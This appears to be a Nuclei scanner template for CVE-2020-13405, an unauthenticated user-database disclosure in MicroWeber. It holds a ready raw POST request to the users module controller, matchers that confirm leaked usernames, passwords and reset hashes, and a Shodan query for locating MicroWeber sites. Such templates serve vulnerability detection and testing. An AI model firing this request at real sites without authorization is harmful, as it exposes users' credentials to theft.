id: CVE-2020-13405
info:
  author: ritikchaddha,amit-jd
  classification:
    cve-id: CVE-2020-13405
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-306
  description: 'The PHP code for controller.php run Laravel''s dump and die function
    on the users database. Dump and die simply prints the contents of the entire PHP
    variable (in this case, the users database) out to HTML.

    '
  metadata:
    shodan-query: http.html:"microweber"
    verified: 'true'
  name: MicroWeber - Unauthenticated User Database Disclosure
  reference:
  - https://rhinosecuritylabs.com/research/microweber-database-disclosure/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-13405
  - https://github.com/microweber/microweber/commit/269320e0e0e06a1785e1a1556da769a34280b7e6
  severity: high
  tags: cve,cve2020,microweber,unauth,disclosure
requests:
- matchers:
  - condition: and
    dsl:
    - contains(body,"username")
    - contains(body,"password")
    - contains(body,"password_reset_hash")
    - status_code==200
    - contains(all_headers,"text/html")
    type: dsl
  payloads:
    endpoint:
    - users/controller
    - modules/users/controller
    - /modules/users/controller
  raw:
  - 'POST /module/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Referer: {{BaseURL}}admin/view:modules/load_module:users


    module={{endpoint}}

    '
